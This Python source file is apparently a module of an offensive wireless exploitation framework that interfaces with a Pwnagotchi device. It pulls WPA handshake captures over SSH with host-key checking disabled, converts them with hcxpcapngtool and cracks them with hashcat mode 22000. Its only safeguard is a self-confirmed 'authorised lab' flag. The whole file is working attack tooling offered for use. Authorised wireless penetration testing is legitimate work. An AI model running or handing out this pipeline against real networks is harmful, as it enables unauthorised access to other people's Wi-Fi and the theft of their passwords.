#!/usr/bin/env python3
# Author: André Henrique (@mrhenrique) | União Geek — https://github.com/Uniao-Geek
"""Pwnagotchi — AI-based WPA handshake harvesting bridge.

Pwnagotchi is a Raspberry Pi-based AI (using reinforcement learning) that
autonomously harvests WPA EAPOL handshakes by passively sniffing Wi-Fi and
using deauthentication attacks to force re-association.

This bridge provides:
  1. **status**: SSH into a running Pwnagotchi and read its JSON API status.
  2. **pull_handshakes**: rsync/scp handshakes (.pcap files) from device to local.
  3. **crack**: run hcxpcapngtool + hashcat on pulled handshakes.
  4. **info**: overview of Pwnagotchi operation.

Incorporated from:
  - submodules/IoT/pwnagotchi (evilsocket / GPL-3.0)

Version: 1.0.0
"""

from __future__ import annotations

import json
import logging
import os
import shutil
import subprocess
from pathlib import Path
from typing import List, Optional

from wirelessxpl.core.exploit import *
from wirelessxpl.modules.generic.wifi_lab._disclaimer import require_authorised_lab

logger = logging.getLogger(__name__)

_DEFAULT_HANDSHAKE_DIR = "/root/handshakes"
_DEFAULT_LOCAL_DIR = str(Path(__file__).resolve().parents[5] / ".tmp" / "pwnagotchi_handshakes")


class Exploit(Exploit):
    """Pwnagotchi handshake harvester bridge (SSH/rsync/hashcat)."""

    __info__ = {
        "name": "Pwnagotchi WPA Handshake Bridge",
        "description": (
            "Interfaces with a Pwnagotchi device (RPi + AI) for autonomous WPA "
            "handshake harvesting. Modes: status (read device JSON API), "
            "pull_handshakes (scp/rsync .pcap from device), crack (hcxpcapngtool + "
            "hashcat mode 22000), info (overview). Requires SSH access to device."
        ),
        "authors": (
            "André Henrique (@mrhenrike) | União Geek",
            "evilsocket (Pwnagotchi GPL-3.0, interfaced via SSH/rsync)",
        ),
        "references": (
            "https://github.com/evilsocket/pwnagotchi",
            "https://pwnagotchi.ai/",
        ),
        "devices": ("wifi", "802.11 WPA2 EAPOL handshake"),
    }

    mode = OptString(
        "info",
        "Modo: info | status | pull_handshakes | crack",
    )
    device_ip = OptString(
        "10.0.0.2",
        "IP do Pwnagotchi (USB tether padrão: 10.0.0.2)",
    )
    device_user = OptString("root", "Usuário SSH no Pwnagotchi")
    ssh_key = OptString(
        "~/.ssh/pwnagotchi_id_rsa",
        "Chave privada SSH (deixe vazio para senha interativa)",
    )
    remote_handshake_dir = OptString(
        _DEFAULT_HANDSHAKE_DIR,
        "Diretório de handshakes no Pwnagotchi",
    )
    local_handshake_dir = OptString(
        _DEFAULT_LOCAL_DIR,
        "Diretório local para salvar .pcap baixados",
    )
    wordlist = OptString("", "Wordlist para hashcat (modo crack)")
    hashcat_opts = OptString("", "Opções extras para hashcat (ex.: --force -O)")
    dry_run = OptBool(False, "Exibir comandos sem executar")
    i_know_scope = OptBool(False, "Confirmo que estou em laboratório autorizado")

    _VALID_MODES = frozenset({"info", "status", "pull_handshakes", "crack"})

    def _ssh_key_args(self) -> List[str]:
        key = os.path.expanduser(str(self.ssh_key).strip())
        if key and os.path.isfile(key):
            return ["-i", key]
        return []

    def _info_mode(self) -> None:
        print_status("Pwnagotchi — AI WPA handshake harvester")
        print_info("Dispositivo padrão: Raspberry Pi Zero W com Kali Linux + pwnagotchi.")
        print_info("Conecta via USB tether (RNDIS) — IP padrão: 10.0.0.2.")
        print_info(
            "Modos de operação:\n"
            "  MANU — manual (sem AI, apenas interface)\n"
            "  AUTO — AI aprende a maximizar capturas de handshake\n"
            "  AI   — modelo treinado (melhor performance)"
        )
        print_info("API JSON: http://10.0.0.2/api/v1/")
        print_info("\nHandshakes ficam em /root/handshakes/*.pcap no dispositivo.")
        print_info("Use mode=pull_handshakes para baixar e mode=crack para processar.")

    def _status_mode(self) -> None:
        ip = str(self.device_ip).strip()
        user = str(self.device_user).strip()
        ssh = shutil.which("ssh")
        if not ssh:
            print_error("ssh não encontrado no PATH.")
            return

        cmd = [ssh] + self._ssh_key_args() + [
            "-o", "StrictHostKeyChecking=no",
            "-o", "ConnectTimeout=5",
            "{}@{}".format(user, ip),
            "curl -s http://127.0.0.1/api/v1/",
        ]
        cmd_str = " ".join(cmd)
        if self.dry_run:
            print_info("DRY RUN — {}".format(cmd_str))
            return

        print_status("Consultando Pwnagotchi em {}@{}…".format(user, ip))
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=10, check=False)
            if result.stdout:
                try:
                    data = json.loads(result.stdout)
                    print_status("=== Status Pwnagotchi ===")
                    for k, v in data.items():
                        print_info("  {:30}: {}".format(k, v))
                except json.JSONDecodeError:
                    print_info(result.stdout.strip())
            if result.returncode != 0 and result.stderr:
                print_error(result.stderr.strip())
        except subprocess.TimeoutExpired:
            print_error("Timeout ao conectar em {}.".format(ip))
        except Exception as exc:
            print_error("Erro SSH: {}".format(exc))

    def _pull_handshakes_mode(self) -> None:
        ip = str(self.device_ip).strip()
        user = str(self.device_user).strip()
        remote_dir = str(self.remote_handshake_dir).strip()
        local_dir = str(self.local_handshake_dir).strip()

        os.makedirs(local_dir, exist_ok=True)

        rsync = shutil.which("rsync")
        scp = shutil.which("scp")

        if rsync:
            key_args = self._ssh_key_args()
            ssh_cmd = "ssh -o StrictHostKeyChecking=no"
            if key_args:
                ssh_cmd += " " + " ".join(key_args)
            cmd = [rsync, "-avz", "-e", ssh_cmd,
                   "{}@{}:{}/*.pcap".format(user, ip, remote_dir),
                   local_dir + "/"]
        elif scp:
            cmd = [scp] + self._ssh_key_args() + [
                "-o", "StrictHostKeyChecking=no",
                "-r", "{}@{}:{}/".format(user, ip, remote_dir),
                local_dir,
            ]
        else:
            print_error("rsync ou scp necessários para pull_handshakes.")
            return

        cmd_str = " ".join(cmd)
        if self.dry_run:
            print_info("DRY RUN — {}".format(cmd_str))
            return

        print_status("Baixando handshakes de {}:{} para {}…".format(ip, remote_dir, local_dir))
        try:
            subprocess.run(cmd, check=False)
            pcaps = list(Path(local_dir).glob("*.pcap"))
            print_success("{} arquivo(s) .pcap em {}.".format(len(pcaps), local_dir))
        except KeyboardInterrupt:
            print_info("\nInterrompido.")
        except Exception as exc:
            print_error("Erro ao baixar handshakes: {}".format(exc))

    def _crack_mode(self) -> None:
        local_dir = str(self.local_handshake_dir).strip()
        wordlist = str(self.wordlist).strip()
        if not wordlist:
            print_error("Defina wordlist para o modo crack.")
            return

        pcaps = list(Path(local_dir).glob("*.pcap"))
        if not pcaps:
            print_error("Nenhum .pcap em {}. Use mode=pull_handshakes primeiro.".format(local_dir))
            return

        hcxpng = shutil.which("hcxpcapngtool")
        hashcat = shutil.which("hashcat")
        if not hcxpng or not hashcat:
            print_error("hcxpcapngtool e/ou hashcat não encontrados no PATH.")
            return

        combined_pcap = os.path.join(local_dir, "combined.pcapng")
        hash_file = os.path.join(local_dir, "hashes.hc22000")

        # Merge pcaps (cat-like for pcapng; use mergecap if available)
        mergecap = shutil.which("mergecap")
        if mergecap:
            merge_cmd = [mergecap, "-w", combined_pcap] + [str(p) for p in pcaps]
        else:
            merge_cmd = None

        if self.dry_run:
            print_info("DRY RUN — processando {} .pcap(s)".format(len(pcaps)))
            print_info("hcxpcapngtool -o {} <pcaps>".format(hash_file))
            print_info("hashcat -m 22000 {} {}".format(hash_file, wordlist))
            return

        # Convert each pcap individually if no mergecap
        print_status("Convertendo {} pcap(s) para hash 22000…".format(len(pcaps)))
        all_hashes: List[str] = []
        for pcap in pcaps:
            h_out = str(pcap) + ".hc22000"
            result = subprocess.run(
                [hcxpng, "-o", h_out, str(pcap)],
                capture_output=True, text=True, check=False
            )
            if os.path.isfile(h_out) and os.path.getsize(h_out) > 0:
                all_hashes.append(h_out)

        if not all_hashes:
            print_error("Nenhum hash extraído dos PCAPs.")
            return

        # Combine hashes
        with open(hash_file, "w") as out_fh:
            for hf in all_hashes:
                with open(hf) as in_fh:
                    out_fh.write(in_fh.read())

        print_success("{} hash(es) em {}.".format(sum(1 for _ in open(hash_file)), hash_file))

        extra_opts = str(self.hashcat_opts).strip().split() if str(self.hashcat_opts).strip() else []
        crack_cmd = [hashcat, "-m", "22000", hash_file, wordlist] + extra_opts
        print_status("Hashcat: {}".format(" ".join(crack_cmd)))
        try:
            subprocess.run(crack_cmd, check=False)
        except KeyboardInterrupt:
            print_info("\nInterrompido.")


    def check(self) -> str:
        """Verify external tool dependencies are installed."""
        import shutil
        tools: list[str] = []
        src = getattr(self.__class__, "__doc__", "") or ""
        for t in ("aircrack-ng", "airodump-ng", "aireplay-ng", "airmon-ng",
                   "hashcat", "hcxdumptool", "hcxtools", "wifite", "bettercap",
                   "kismet", "hostapd", "dnsmasq", "mdk4", "mdk3",
                   "hostapd-wpe", "hostapd-mana", "eaphammer"):
            if t.replace("-ng", "").replace("-", "") in (src + self.__class__.__name__).lower():
                tools.append(t)
        if not tools:
            tools = ["aircrack-ng"]
        missing = [t for t in tools if not shutil.which(t.rstrip("_"))]
        if missing:
            return f"Missing tools: {', '.join(missing)} - install before use"
        return f"Tool dependencies found: {', '.join(tools)} - prerequisites OK"

    def run(self) -> None:
        require_authorised_lab(self.i_know_scope)
        mode = str(self.mode).strip().lower()
        if mode not in self._VALID_MODES:
            print_error("mode deve ser: {}".format(", ".join(sorted(self._VALID_MODES))))
            return
        dispatch = {
            "info": self._info_mode,
            "status": self._status_mode,
            "pull_handshakes": self._pull_handshakes_mode,
            "crack": self._crack_mode,
        }
        dispatch[mode]()
